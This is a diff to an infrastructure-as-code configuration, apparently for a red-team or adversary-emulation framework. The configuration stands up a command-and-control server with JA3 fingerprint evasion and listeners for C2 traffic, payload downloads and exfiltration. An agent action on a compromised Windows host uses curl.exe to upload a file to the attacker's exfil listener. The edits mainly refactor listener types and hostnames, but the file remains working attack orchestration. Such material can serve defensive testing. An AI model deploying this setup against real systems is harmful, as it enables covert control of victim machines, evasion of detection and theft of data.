@@ -36,6 +36,21 @@ variable "exfil_port" {
     default = "443"
 }
 
+variable "c2_listener_type" {
+    description = "The type of listener to use for the C2 listener."
+    default = "HTTPS"
+}
+
+variable "http_listener_type" {
+    description = "The type of listener to use for the HTTP listener."
+    default = "HTTPS"
+}
+
+variable "exfil_listener_type" {
+    description = "The type of listener to use for the exfil listener."
+    default = "HTTPS"
+}
+
 variable "exfil_file" {
     description = "File name to use for the exfil file."
     default     = "exfil_file.txt"
@@ -118,6 +133,7 @@ resource "task" "c2_server" {
     listener {
         http_malleable {
             Profile     = "trevor.profile"
+            Host        = "${variable.c2_listener_type}://c2-${resource.random_string.random_6.result}.${variable.domain_name}:${variable.c2_port}"
             Port        = variable.c2_port
             StagingKey  = resource.random_string.random_32.result
             JA3_Evasion = "True"
@@ -142,12 +158,12 @@ resource "task" "c2_server" {
 }
 
 resource "listener" "c2_listener" {
-    listener_name = "c2_listener_${local.function.date_statmp}"
-    listener_type = "HTTPS"
+    listener_name = "c2_listener_${local.function.date_stamp}"
+    listener_type = variable.c2_listener_type
     listener_port = variable.c2_port
     task_name     = resource.task.c2_server.task_name
     portgroups    = [resource.portgroup.c2_portgroup.portgroup_name]
-    host_name     = "c2_${resource.random_string.random_6.result}"
+    host_name     = "c2-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
 }
 
@@ -173,12 +189,12 @@ resource "task" "http_server" {
 }
 
 resource "listener" "http_listener" {
-    listener_name = "http_listener_${local.function.date_statmp}"
-    listener_type = "HTTPS"
+    listener_name = "http_listener_${local.function.date_stamp}"
+    listener_type = variable.http_listener_type
     listener_port = variable.http_port
     task_name     = resource.task.http_server.task_name
     portgroups    = [resource.portgroup.http_portgroup.portgroup_name]
-    host_name     = "downloads_${resource.random_string.random_6.result}"
+    host_name     = "downloads-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
 }
 
@@ -204,12 +220,12 @@ resource "task" "exfil_server" {
 }
 
 resource "listener" "exfil_listener" {
-    listener_name = "exfil_listener_${local.function.date_statmp}"
-    listener_type = "HTTPS"
+    listener_name = "exfil_listener_${local.function.date_stamp}"
+    listener_type = variable.exfil_listener_type
     listener_port = variable.exfil_port
     task_name     = resource.task.exfil_server.task_name
     portgroups    = [resource.portgroup.exfil_portgroup.portgroup_name]
-    host_name     = "uploads_${resource.random_string.random_6.result}"
+    host_name     = "uploads-${resource.random_string.random_6.result}"
     domain_name   = variable.domain_name
 }
 
@@ -369,7 +385,7 @@ action "agent_execute_shell_command" "create_exfil_file" {
 action "agent_execute_shell_command" "upload_exfil_file" {
     task_name         = resource.task.c2_server.task_name
     agent_name        = data.wait_for_c2.c2_agent.agent_name
-    command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} ${resource.task.exfil_server.url}"
+    command           = "c:\\Windows\\System32\\curl.exe -k -F file=@${variable.exfil_path}\\${variable.exfil_file} ${resource.listener.exfil_listener.listener_type}://${resource.listener.exfil_listener.host_name}.${resource.listener.exfil_listener.domain_name}:${variable.exfil_port}/p"
     wait_for_results  = true
 }
 
